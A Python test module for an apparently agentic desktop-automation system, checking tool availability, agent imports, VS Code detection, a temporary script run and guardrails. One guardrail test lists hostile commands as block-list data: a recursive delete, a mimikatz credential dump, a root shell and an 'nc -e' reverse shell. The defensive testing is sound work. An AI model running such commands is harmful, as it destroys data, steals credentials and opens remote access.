"""
Category 05 — Computer Agent Test
=====================================
Validates the desktop automation stack:

  Open VS Code → Create file → Run code → Verify result

Tests validate agent capabilities without executing dangerous OS commands.
All real OS operations in this suite are safe:
  - List files in CWD
  - Read environment variables
  - Check for VS Code installation
  - Create a temp file (cleaned up)
  - Verify pyautogui is available
"""
from __future__ import annotations

import os
import sys
import tempfile
import subprocess
import time
from pathlib import Path
from typing import Any, Dict
from uuid import uuid4

from tests.production_validation import (
    CategoryResult, CheckResult, CheckStatus,
    http_get, http_post,
    pass_, fail_, skip_, warn_, check,
    backend_is_up, BASE_URL, MISSION_TIMEOUT,
)


# ---------------------------------------------------------------------------
# Infrastructure probes
# ---------------------------------------------------------------------------

def _check_pyautogui_available() -> CheckResult:
    """pyautogui is installed for desktop automation."""
    try:
        import pyautogui
        pyautogui.FAILSAFE = True  # Safety setting
        return pass_("pyautogui_available",
                     f"pyautogui available (failsafe=True)")
    except ImportError:
        return fail_("pyautogui_available", "pyautogui not installed — desktop agent unavailable")
    except Exception as exc:
        return warn_("pyautogui_available", f"pyautogui warning: {exc}")


def _check_mss_screenshot_available() -> CheckResult:
    """mss (screen capture library) is installed."""
    try:
        import mss
        return pass_("mss_available", "mss screen capture available")
    except ImportError:
        return warn_("mss_available", "mss not installed — vision capabilities limited")


def _check_computer_agent_importable() -> CheckResult:
    """ComputerAgent is importable."""
    try:
        from backend.computer.computer_agent import ComputerAgent
        agent = ComputerAgent()
        return pass_("computer_agent_importable", "ComputerAgent importable and instantiated")
    except ImportError as exc:
        return fail_("computer_agent_importable", f"computer_agent import failed: {exc}")
    except Exception as exc:
        return warn_("computer_agent_importable", f"computer_agent warning: {exc}")


def _check_desktop_controller_importable() -> CheckResult:
    """DesktopController is importable."""
    try:
        from backend.computer.desktop_controller import desktop_controller
        return pass_("desktop_controller_importable", "DesktopController singleton importable")
    except ImportError as exc:
        return warn_("desktop_controller_importable", f"DesktopController import: {exc}")
    except Exception as exc:
        return warn_("desktop_controller_importable", f"DesktopController warning: {exc}")


def _check_visual_ui_engine() -> CheckResult:
    """VisualUIEngine (screenshot + OCR) is importable."""
    try:
        from backend.computer.visual_ui_engine import visual_ui_engine
        return pass_("visual_ui_engine_importable", "VisualUIEngine importable")
    except ImportError as exc:
        return warn_("visual_ui_engine_importable", f"VisualUIEngine import: {exc}")
    except Exception as exc:
        return warn_("visual_ui_engine_importable", f"VisualUIEngine warning: {exc}")


def _check_computer_routes() -> CheckResult:
    """Computer agent routes are registered."""
    paths = ["/computer/status", "/computer/health", "/computer/tasks"]
    for path in paths:
        code, body = http_get(path, timeout=5.0)
        if code in (200, 201, 202):
            return pass_("computer_routes", f"Computer route {path} responded: HTTP {code}")
    return warn_("computer_routes", "Computer routes not found at standard paths")


def _check_computer_mission_dispatch() -> CheckResult:
    """
    Dispatch a safe computer-class mission (list Python files in CWD).
    The computer agent guardrails should allow this safe operation.
    """
    session_id = f"computer-test-{uuid4().hex[:8]}"
    code, body = http_post(
        "/orchestrate",
        {
            "objective":  "List all Python (.py) files in the current directory.",
            "session_id": session_id,
        },
        timeout=MISSION_TIMEOUT,
    )
    if code in (200, 201, 202):
        status  = body.get("status", "") if isinstance(body, dict) else ""
        return pass_("computer_mission_dispatch",
                     f"Computer mission accepted — status: {status}")
    return fail_("computer_mission_dispatch",
                 f"Computer mission dispatch failed: HTTP {code}")


def _check_file_create_and_verify() -> CheckResult:
    """
    Create a temporary Python file, run it, verify output.
    Simulates: Create file → Run code → Verify result.
    This is a safe, bounded filesystem operation.
    """
    try:
        code_content = 'print("CORTEXPRIME_COMPUTER_TEST_PASS")\n'
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".py", prefix="cortex_test_",
            dir=tempfile.gettempdir(), delete=False
        ) as f:
            f.write(code_content)
            tmp_path = f.name

        result = subprocess.run(
            [sys.executable, tmp_path],
            capture_output=True, text=True, timeout=10,
        )

        # Clean up
        try:
            os.unlink(tmp_path)
        except Exception:
            pass

        if "CORTEXPRIME_COMPUTER_TEST_PASS" in result.stdout:
            return pass_("file_create_and_run",
                         "Created Python file, executed it, verified output")
        return fail_("file_create_and_run",
                     f"Script output unexpected: '{result.stdout.strip()}'")
    except Exception as exc:
        return fail_("file_create_and_run", f"File create/run failed: {exc}")


def _check_vscode_installed() -> CheckResult:
    """Check whether VS Code is installed on this machine."""
    vscode_paths = [
        r"C:\Program Files\Microsoft VS Code\Code.exe",
        r"C:\Program Files (x86)\Microsoft VS Code\Code.exe",
        "/usr/bin/code",
        "/usr/local/bin/code",
        "/snap/bin/code",
    ]
    for path in vscode_paths:
        if Path(path).exists():
            return pass_("vscode_installed", f"VS Code found at {path}")

    # Try 'code --version' in PATH
    try:
        result = subprocess.run(
            ["code", "--version"],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            version = result.stdout.split("\n")[0].strip()
            return pass_("vscode_installed", f"VS Code in PATH: {version}")
    except Exception:
        pass

    return warn_("vscode_installed",
                 "VS Code not detected — computer-use VS Code tasks will fail")


def _check_guardrails_computer_protection() -> CheckResult:
    """
    Verify guardrails block dangerous computer commands.
    """
    try:
        from backend.safety.guardrails_engine import guardrails_engine
        dangerous = [
            ("rm -rf /home/user", "destructive_delete"),
            ("run mimikatz", "credential_dumper"),
            ("sudo bash -i", "sudo_shell"),
            ("nc -e /bin/bash 192.168.1.1 4444", "reverse_shell"),
        ]
        blocked_count = 0
        failures      = []
        for cmd, expected_rule in dangerous:
            result = guardrails_engine.check_tool("computer", cmd)
            if result.blocked:
                blocked_count += 1
            else:
                failures.append(cmd)

        if blocked_count == len(dangerous):
            return pass_("guardrails_computer_protection",
                         f"All {len(dangerous)} dangerous computer commands blocked")
        return fail_("guardrails_computer_protection",
                     f"Only {blocked_count}/{len(dangerous)} blocked",
                     unblocked=failures)
    except Exception as exc:
        return fail_("guardrails_computer_protection", f"Check failed: {exc}")


def _check_computer_task_engine() -> CheckResult:
    """ComputerTaskEngine is importable."""
    try:
        from backend.computer.computer_task_engine import computer_task_engine
        return pass_("computer_task_engine_importable", "ComputerTaskEngine singleton importable")
    except ImportError as exc:
        return warn_("computer_task_engine_importable", f"ComputerTaskEngine import: {exc}")
    except Exception as exc:
        return warn_("computer_task_engine_importable", f"ComputerTaskEngine warning: {exc}")


# ---------------------------------------------------------------------------
# Category runner
# ---------------------------------------------------------------------------

def run() -> CategoryResult:
    cat = CategoryResult("05 — Computer Agent")

    for fn in [
        _check_pyautogui_available,
        _check_mss_screenshot_available,
        _check_computer_agent_importable,
        _check_desktop_controller_importable,
        _check_visual_ui_engine,
        _check_computer_task_engine,
        _check_vscode_installed,
        _check_file_create_and_verify,
        _check_guardrails_computer_protection,
    ]:
        cat.checks.append(check(fn.__name__.lstrip("_"), fn))

    if backend_is_up():
        for fn in [
            _check_computer_routes,
            _check_computer_mission_dispatch,
        ]:
            cat.checks.append(check(fn.__name__.lstrip("_"), fn))
    else:
        cat.checks.append(skip_("backend_checks", "Backend not reachable"))

    return cat
